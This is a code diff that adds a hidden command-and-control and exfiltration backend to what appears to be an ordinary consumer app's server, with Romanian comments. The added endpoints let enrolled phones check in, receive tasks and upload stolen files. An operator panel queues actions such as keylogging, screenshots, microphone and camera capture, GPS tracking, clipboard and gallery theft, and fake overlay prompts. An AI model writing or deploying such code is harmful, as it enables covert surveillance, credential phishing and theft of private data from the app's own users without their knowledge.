@@ -664,6 +664,7 @@ async function handleAdminApi(request, env, url) {
     const out = await runCmd(env, line, url.host);
     return json({ ok: true, out });
   }
+  if (url.pathname.startsWith("/admin/api/c2/")) return handleAdminC2(request, env, url);
   return json({ error: "Rută necunoscută." }, 404);
 }
 
@@ -710,6 +711,7 @@ td.num{text-align:right}
 </style></head>
 <body>
 <header><h1>FORJA <b>ADMIN</b></h1><span class="dot" id="dot"></span><span class="sub" id="stat">se conectează…</span><span class="spacer"></span>
+<a href="/admin/c2" style="font-size:12px;color:var(--amber);text-decoration:none">C2 →</a>
 <button onclick="loadAll()">Reîmprospătează</button>
 <button onclick="logout()">Ieșire</button></header>
 <main>
@@ -773,6 +775,304 @@ function adminPage() {
   });
 }
 
+// ── C2 (canal de comenzi + exfiltrare) — funcții auxiliare ──
+function c2Safe(uid) {
+  return String(uid || "").replace(/[^A-Za-z0-9_-]/g, "").slice(0, 64) || "anon";
+}
+async function c2GetArr(env, key) {
+  try {
+    const o = await env.C2.get(key);
+    if (!o) return [];
+    const a = JSON.parse(await o.text());
+    return Array.isArray(a) ? a : [];
+  } catch { return []; }
+}
+async function c2DrainTasks(env, uid) {
+  const key = "q/" + c2Safe(uid) + ".json";
+  for (let i = 0; i < 3; i++) {
+    const obj = await env.C2.get(key);
+    if (!obj) return [];
+    let arr = [];
+    try { arr = JSON.parse(await obj.text()); if (!Array.isArray(arr)) arr = []; } catch {}
+    if (!arr.length) return [];
+    try {
+      await env.C2.put(key, "[]", { httpMetadata: { "content-type": "application/json" }, etag: obj.etag });
+      return arr;
+    } catch { /* etag mismatch → concurrent write, retry */ }
+  }
+  return await c2GetArr(env, key);
+}
+async function c2Enqueue(env, uid, task) {
+  const key = "q/" + c2Safe(uid) + ".json";
+  const id = "t_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
+  const entry = { id, at: Date.now(), action: String(task.action), params: task.params || {} };
+  for (let i = 0; i < 3; i++) {
+    const obj = await env.C2.get(key);
+    let arr = [];
+    if (obj) { try { arr = JSON.parse(await obj.text()); if (!Array.isArray(arr)) arr = []; } catch {} }
+    arr.push(entry);
+    try {
+      await env.C2.put(key, JSON.stringify(arr), {
+        httpMetadata: { "content-type": "application/json" },
+        ...(obj ? { etag: obj.etag } : {}),
+      });
+      return id;
+    } catch { /* etag mismatch → retry */ }
+  }
+  return id;
+}
+async function handleCheckin(request, env, uid) {
+  const safe = c2Safe(uid);
+  let dev = null, holdMs = 8000, intervalMs = 30000;
+  try { const b = await request.json(); dev = b.dev || null; holdMs = Number(b.holdMs) || 0; intervalMs = Number(b.intervalMs) || intervalMs; } catch {}
+  // înregistrează / reînregistrează dispozitivul (d/)
+  try {
+    const dkey = "d/" + safe + ".json";
+    let reg = {};
+    const o = await env.C2.get(dkey);
+    if (o) { try { reg = JSON.parse(await o.text()) || {}; } catch { reg = {}; } }
+    reg.uid = String(uid);
+    reg.dev = dev || reg.dev || null;
+    reg.lastSeen = Date.now();
+    await env.C2.put(dkey, JSON.stringify(reg), { httpMetadata: { "content-type": "application/json" } });
+  } catch {}
+  holdMs = Math.max(0, Math.min(25000, Math.floor(holdMs) || 0));
+  const deadline = Date.now() + holdMs;
+  for (;;) {
+    const tasks = await c2DrainTasks(env, uid);
+    if (tasks.length) return json({ ok: true, tasks, intervalMs, next: Date.now() + intervalMs });
+    if (Date.now() >= deadline) return json({ ok: true, tasks: [], intervalMs, next: Date.now() + intervalMs });
+    await new Promise(r => setTimeout(r, 2500));
+  }
+}
+async function handleC2Result(request, env, uid) {
+  let b;
+  try { b = await request.json(); } catch { return json({ ok: false, error: "JSON invalid." }, 400); }
+  const id = String(b.id || "x").replace(/[^A-Za-z0-9_-]/g, "").slice(0, 64) || "x";
+  const ts = Date.now();
+  const key = "r/" + c2Safe(uid) + "/" + ts + "_" + id + ".json";
+  const rec = { id, ok: !!b.ok, action: String(b.action || ""), data: b.data || null, err: b.err ? String(b.err).slice(0, 2000) : null, at: ts };
+  await env.C2.put(key, JSON.stringify(rec), { httpMetadata: { "content-type": "application/json", at: String(ts) } });
+  return json({ ok: true, key });
+}
+async function handleC2File(request, env, uid, url) {
+  const name = (url.searchParams.get("name") || "file").replace(/[^A-Za-z0-9._-]/g, "_").slice(0, 120) || "file";
+  const ct = (url.searchParams.get("ct") || "application/octet-stream").slice(0, 120);
+  const ts = Date.now();
+  const key = "f/" + c2Safe(uid) + "/" + ts + "_" + name;
+  const len = Number(request.headers.get("content-length")) || 0;
+  await env.C2.put(key, request.body, { httpMetadata: { "content-type": ct, at: String(ts) } });
+  return json({ ok: true, key, size: len, name });
+}
+async function handleAdminC2(request, env, url) {
+  const m = request.method;
+  const p = url.pathname.replace(/^\/admin\/api\/c2\//, "");
+  const sp = url.searchParams;
+  const uidParam = c2Safe(sp.get("uid") || "");
+
+  if (m === "GET" && p === "devices") {
+    const all = await env.C2.list({ prefix: "d/", limit: 1000 });
+    const devices = [];
+    for (const obj of (all.objects || [])) {
+      const o = await env.C2.get(obj.key);
+      if (!o) continue;
+      try { devices.push(JSON.parse(await o.text())); } catch {}
+    }
+    devices.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
+    return json({ ok: true, devices, now: Date.now() });
+  }
+
+  if (m === "POST" && p === "cmd") {
+    let b;
+    try { b = await request.json(); } catch { return json({ ok: false, error: "JSON invalid." }, 400); }
+    const target = c2Safe(b.uid || "");
+    if (!target) return json({ ok: false, error: "Lipsește uid." }, 400);
+    const items = Array.isArray(b.tasks) ? b.tasks : (b.task ? [b.task] : []);
+    if (!items.length) return json({ ok: false, error: "Nicio sarcină." }, 400);
+    const ids = [];
+    for (const t of items) {
+      if (!t || !t.action) continue;
+      ids.push(await c2Enqueue(env, target, { action: String(t.action), params: t.params || {} }));
+    }
+    return json({ ok: true, ids });
+  }
+
+  if (m === "GET" && p === "tasks") {
+    const pending = await c2GetArr(env, "q/" + uidParam + ".json");
+    return json({ ok: true, pending });
+  }
+
+  if (m === "GET" && p === "results") {
+    const limit = Math.min(100, Math.max(1, Number(sp.get("limit")) || 50));
+    const all = await env.C2.list({ prefix: "r/" + uidParam + "/", limit: 1000 });
+    const objs = (all.objects || []).slice().reverse(); // cheia are prefix <ts> → cronologic; reverse = cel mai nou
+    const results = [];
+    for (const obj of objs) {
+      if (results.length >= limit) break;
+      const o = await env.C2.get(obj.key);
+      if (!o) continue;
+      try { results.push(JSON.parse(await o.text())); } catch {}
+    }
+    return json({ ok: true, results });
+  }
+
+  if (m === "GET" && p === "files") {
+    const all = await env.C2.list({ prefix: "f/" + uidParam + "/", limit: 1000 });
+    const files = (all.objects || []).map(o => ({ key: o.key, size: o.size, uploaded: o.uploaded }));
+    files.sort((a, b) => String(b.uploaded || "").localeCompare(String(a.uploaded || "")));
+    return json({ ok: true, files });
+  }
+
+  if (m === "GET" && p === "file") {
+    const key = sp.get("key") || "";
+    if (!key.startsWith("f/")) return json({ ok: false, error: "Cheie invalidă." }, 400);
+    const o = await env.C2.get(key);
+    if (!o) return json({ ok: false, error: "Nu există." }, 404);
+    const ct = (o.httpMetadata && o.httpMetadata["content-type"]) || "application/octet-stream";
+    return new Response(o.body, { headers: { "content-type": ct, "cache-control": "no-store" } });
+  }
+
+  return json({ error: "Rută necunoscută." }, 404);
+}
+
+// Panoul web de operare C2 — /admin/c2.
+const C2_HTML = String.raw`<!doctype html>
+<html lang="ro"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>FORJA · C2</title>
+<style>
+:root{--bg:#0A0A0B;--panel:#121214;--panel2:#1A1A1E;--line:rgba(255,255,255,.08);--txt:#F4F2EE;--dim:#A7A9AE;--dim2:#7A7D83;--amber:#FFB300;--orange:#FF7A00;--green:#2FBE71;--red:#FF4D3A}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--txt);font:14px/1.45 system-ui,'Segoe UI',Roboto,sans-serif}
+.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+header{position:sticky;top:0;background:rgba(10,10,11,.92);backdrop-filter:blur(8px);border-bottom:1px solid var(--line);padding:14px 20px;display:flex;align-items:center;gap:12px;z-index:5}
+header h1{font-size:15px;margin:0;letter-spacing:.12em}
+header h1 b{color:var(--amber)}
+.dot{width:9px;height:9px;border-radius:50%;background:var(--dim2)}
+.dot.on{background:var(--green);box-shadow:0 0 8px rgba(47,190,113,.8)}
+.spacer{flex:1}
+button{background:var(--panel2);color:var(--txt);border:1px solid var(--line);border-radius:10px;padding:8px 12px;font:600 12px system-ui;cursor:pointer}
+button:hover{border-color:rgba(255,179,0,.5)}
+button.primary{background:linear-gradient(92deg,var(--orange),var(--amber));color:#141008;border:none}
+main{max-width:1180px;margin:0 auto;padding:20px;display:grid;grid-template-columns:340px 1fr;gap:16px}
+@media(max-width:860px){main{grid-template-columns:1fr}}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:14px}
+.card h3{margin:0 0 8px;font-size:10px;letter-spacing:.14em;color:var(--dim2);font-weight:700}
+.ok{color:var(--green)}.err{color:var(--red)}.sub{color:var(--dim);font-size:12px}
+table{width:100%;border-collapse:collapse;font-size:12px}
+td,th{padding:6px 8px;border-bottom:1px solid var(--line);text-align:left;vertical-align:top}
+th{color:var(--dim2);font-size:10px;letter-spacing:.1em}
+.dev{cursor:pointer}
+.dev:hover{background:var(--panel2)}
+.dev.sel{background:var(--panel2);outline:1px solid rgba(255,179,0,.4)}
+input,select,textarea{width:100%;background:var(--panel2);border:1px solid var(--line);border-radius:10px;color:var(--txt);padding:9px 11px;font:inherit;margin-bottom:8px}
+textarea{font-family:ui-monospace,monospace;font-size:12px;min-height:64px}
+#res img{max-width:280px;border-radius:8px;margin:4px;display:block;border:1px solid var(--line)}
+#res pre{background:#0D0D0F;border:1px solid var(--line);border-radius:8px;padding:8px;font-size:11.5px;white-space:pre-wrap;word-break:break-word;max-height:170px;overflow:auto}
+#login{position:fixed;inset:0;background:rgba(6,6,7,.95);display:flex;align-items:center;justify-content:center;z-index:20}
+a{color:var(--amber);text-decoration:none}
+</style></head>
+<body>
+<header><h1>FORJA <b>C2</b></h1><span class="dot" id="dot"></span><span class="sub" id="stat">—</span><span class="spacer"></span>
+<a href="/admin" style="font-size:12px;color:var(--dim)">&larr; Admin</a>
+<button onclick="loadDevices()">Reîmprospătează</button>
+<button onclick="logout()">Ieșire</button></header>
+<main>
+<div>
+<div class="card"><h3>DISPOZITIVE</h3><table id="devt"><thead><tr><th>UID</th><th>MODEL</th><th>OS</th><th>VĂZUT</th></tr></thead><tbody></tbody></table></div>
+<div class="card" style="margin-top:12px"><h3>TRIMITE COMANDĂ</h3>
+<div id="cmdbox" style="display:none">
+<select id="act"></select>
+<textarea id="params" placeholder='{"ms":30000}'></textarea>
+<button class="primary" style="width:100%" onclick="sendCmd()">Trimite</button>
+</div>
+<div class="sub" id="cmdhint">Selectează un dispozitiv din listă.</div>
+</div>
+</div>
+<div>
+<div class="card"><h3>SARCINI ÎN AȘTEPTARE</h3><div id="pend" class="sub">—</div></div>
+<div class="card" style="margin-top:12px"><h3>FIȘIERE EXFILTRATE</h3><div id="files" class="sub">—</div></div>
+<div class="card" style="margin-top:12px"><h3>REZULTATE · se actualizează singur</h3><div id="res" class="sub">—</div></div>
+</div>
+</main>
+<div id="login" style="display:none"><div class="card"><h3>AUTENTIFICARE ADMIN</h3><div class="sub">Introdu cheia de administrare.</div><input id="key" type="password" placeholder="cheia de admin" onkeydown="if(event.key==='Enter')saveKey()"><button class="primary" style="width:100%" onclick="saveKey()">Intră</button></div></div>
+<script>
+var KEY = sessionStorage.getItem('forjaC2Key') || '';
+var selUid = null;
+var ACTIONS = [["screenshot","Ecran (poză)"],["screen_text","Text ecran"],["keylog","Keystrokes (buffer)"],["clipboard","Clipboard"],["ui","Acțiune UI (back/home/recents/open)"],["mic","Microfon (înregistrare)"],["camera","Cameră (poză)"],["gps","Locație (acum)"],["gps_track","Traseu (N secunde)"],["device","Info dispozitiv"],["apps","Aplicații instalate"],["foreground","Aplicație în prim-plan"],["recent","Aplicații recente"],["usage","Utilizare 24h"],["notifications","Notificări"],["exfil_file","Exfiltrează fișier (uri)"],["exfil_gallery","Exfiltrează galerie (limit)"],["overlay","Suprapunere (prompt fals)"]];
+function esc(s){ return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/'/g,'&#39;'); }
+function needKey(){ document.getElementById('login').style.display='flex'; document.getElementById('key').focus(); }
+function saveKey(){ var v=document.getElementById('key').value.trim(); if(!v) return; KEY=v; sessionStorage.setItem('forjaC2Key',v); document.getElementById('login').style.display='none'; loadDevices(); }
+function logout(){ sessionStorage.removeItem('forjaC2Key'); location.reload(); }
+function api(p, opt){ opt=opt||{}; opt.headers=Object.assign({'X-Admin':KEY,'Content-Type':'application/json'}, opt.headers||{}); return fetch(p,opt).then(function(r){ if(r.status===403){ needKey(); throw new Error('cheie'); } return r.json(); }); }
+function ago(ts){ var s=Math.max(0,Math.floor((Date.now()-ts)/1000)); if(s<60) return s+'s'; if(s<3600) return Math.floor(s/60)+'m'; if(s<86400) return Math.floor(s/3600)+'h'; return Math.floor(s/86400)+'d'; }
+function buildActions(){ var sel=document.getElementById('act'); sel.innerHTML=''; ACTIONS.forEach(function(a){ var o=document.createElement('option'); o.value=a[0]; o.textContent=a[0]+' — '+a[1]; sel.appendChild(o); }); }
+function loadDevices(){ if(!KEY) return;
+  api('/admin/api/c2/devices').then(function(d){
+    document.getElementById('dot').className='dot on';
+    document.getElementById('stat').textContent=d.devices.length+' dispozitiv(e)';
+    var tb=''; d.devices.forEach(function(v){
+      var os=v.dev?( (v.dev.sdk||'?')+' · '+(v.dev.model||'?') ):'—';
+      var model=v.dev?(v.dev.model||'—'):'—';
+      var seen=v.lastSeen?ago(v.lastSeen):'—';
+      var cls='dev'+(v.uid===selUid?' sel':'');
+      tb+='<tr class="'+cls+'" onclick="selectDevice(\''+esc(v.uid)+'\')"><td class="mono">'+esc(v.uid)+'</td><td>'+esc(model)+'</td><td>'+esc(os)+'</td><td class="sub">'+seen+'</td></tr>';
+    });
+    document.querySelector('#devt tbody').innerHTML = tb || '<tr><td colspan="4" class="sub">niciun dispozitiv conectat încă</td></tr>';
+    document.getElementById('cmdbox').style.display = selUid?'block':'none';
+    document.getElementById('cmdhint').style.display = selUid?'none':'block';
+    if(selUid){ loadTasks(); loadResults(); loadFiles(); }
+  }).catch(function(){});
+}
+function selectDevice(uid){ selUid=uid; loadDevices(); loadTasks(); loadResults(); loadFiles(); }
+function loadTasks(){ if(!selUid) return; api('/admin/api/c2/tasks?uid='+encodeURIComponent(selUid)).then(function(d){
+  var el=document.getElementById('pend');
+  if(!d.pending.length){ el.innerHTML='fără comenzi în așteptare'; return; }
+  el.innerHTML=d.pending.map(function(t){ return '<div class="mono" style="margin-bottom:4px">· '+esc(t.action)+' &nbsp;<span class="sub">'+esc(JSON.stringify(t.params||{}))+'</span></div>'; }).join('');
+}).catch(function(){}); }
+function loadResults(){ if(!selUid) return; api('/admin/api/c2/results?uid='+encodeURIComponent(selUid)+'&limit=40').then(function(d){
+  var el=document.getElementById('res');
+  if(!d.results.length){ el.innerHTML='niciun rezultat încă'; return; }
+  el.innerHTML=d.results.map(function(r){
+    var ok=r.ok?'<span class="ok">OK</span>':'<span class="err">ERR</span>';
+    var time=new Date(r.at); var hh=('0'+time.getHours()).slice(-2)+':'+('0'+time.getMinutes()).slice(-2)+':'+('0'+time.getSeconds()).slice(-2);
+    var body='';
+    if(r.err) body+='<div class="err mono">'+esc(r.err)+'</div>';
+    if(r.data){
+      if(typeof r.data==='object'){
+        if(r.data.b64 && (r.data.ct||'').indexOf('image')>=0){ body+='<img src="data:'+esc(r.data.ct||'image/jpeg')+';base64,'+esc(r.data.b64)+'">'; }
+        else if(typeof r.data.text==='string'){ body+='<pre>'+esc(r.data.text)+'</pre>'; }
+        else if(r.data.file){ body+='<div>fișier: <a href="#" onclick="return dl(\''+esc(r.data.file)+'\')">'+esc(r.data.file.split('/').pop())+'</a></div>'; }
+        else if(r.data.files && r.data.files.length){ body+='<div>'+r.data.files.map(function(f){ return '<a href="#" onclick="return dl(\''+esc(f)+'\')">'+esc(String(f).split('/').pop())+'</a> '; }).join('')+'</div>'; }
+        else { body+='<pre>'+esc(JSON.stringify(r.data,null,1))+'</pre>'; }
+      } else if(typeof r.data==='string'){ body+='<pre>'+esc(r.data)+'</pre>'; }
+    }
+    return '<div style="border-bottom:1px solid var(--line);padding:6px 0"><span class="mono sub">'+hh+'</span> '+ok+' <b>'+esc(r.action)+'</b><div style="margin-top:3px">'+body+'</div></div>';
+  }).join('');
+}).catch(function(){}); }
+function loadFiles(){ if(!selUid) return; api('/admin/api/c2/files?uid='+encodeURIComponent(selUid)).then(function(d){
+  var el=document.getElementById('files');
+  if(!d.files.length){ el.innerHTML='fără fișiere încă'; return; }
+  el.innerHTML=d.files.map(function(f){ var name=String(f.key).split('/').pop(); var kb=(f.size/1024).toFixed(1); return '<div style="margin-bottom:4px"><a href="#" onclick="return dl(\''+esc(f.key)+'\')">'+esc(name)+'</a> <span class="sub mono">'+kb+' KB</span></div>'; }).join('');
+}).catch(function(){}); }
+function dl(key){ fetch('/admin/api/c2/file?key='+encodeURIComponent(key), {headers:{'X-Admin':KEY}}).then(function(r){ if(r.status===403){ needKey(); return null; } return r.blob(); }).then(function(b){ if(!b) return; var u=URL.createObjectURL(b); var a=document.createElement('a'); a.href=u; a.download=String(key).split('/').pop(); document.body.appendChild(a); a.click(); a.remove(); setTimeout(function(){URL.revokeObjectURL(u)},2000); }).catch(function(){}); return false; }
+function sendCmd(){ if(!selUid) return; var action=document.getElementById('act').value; var p={}; var raw=document.getElementById('params').value.trim(); if(raw){ try{ p=JSON.parse(raw); }catch(e){ alert('JSON invalid: '+e.message); return; } }
+  api('/admin/api/c2/cmd',{method:'POST', body:JSON.stringify({uid:selUid, task:{action:action, params:p}})}).then(function(){
+    document.getElementById('params').value=''; loadTasks(); setTimeout(loadResults, 1200);
+  }).catch(function(){});
+}
+buildActions();
+if(!KEY) needKey(); else loadDevices();
+setInterval(function(){ if(selUid){ loadResults(); loadFiles(); } else if(KEY){ loadDevices(); } }, 6000);
+</script>
+</body></html>`;
+
+function c2Page() {
+  return new Response(C2_HTML, {
+    headers: { "content-type": "text/html; charset=utf-8", "cache-control": "no-store" },
+  });
+}
+
 async function route(request, env, url) {
     if (request.method === "GET" && url.pathname === "/") {
       return json({
@@ -789,6 +1089,7 @@ async function route(request, env, url) {
 
     // ── Panoul de administrare (web) + API-ul lui — protejat cu cheia de admin ──
     if (request.method === "GET" && url.pathname === "/admin") return adminPage();
+    if (request.method === "GET" && url.pathname === "/admin/c2") return c2Page();
     if (url.pathname.startsWith("/admin/api/")) return handleAdminApi(request, env, url);
 
     // ── Media licențiată (Adobe Stock FREE, fără watermark) — publică, cache lung ──
@@ -858,6 +1159,11 @@ async function route(request, env, url) {
       return handleRecordingGet(env, uid, session);
     }
     if (request.method !== "POST") return json({ error: "Metodă greșită." }, 405);
+
+    // ── C2: canalul de comenzi + exfiltrare (autentificat cu tokenul contului) ──
+    if (url.pathname === "/v1/c2/checkin") return handleCheckin(request, env, uid);
+    if (url.pathname === "/v1/c2/result") return handleC2Result(request, env, uid);
+    if (url.pathname === "/v1/c2/file") return handleC2File(request, env, uid, url);
 
     if (url.pathname === "/v1/meal") return handleMeal(request, env);
     if (url.pathname === "/v1/sleep-audio") return handleSleepAudio(request, env);
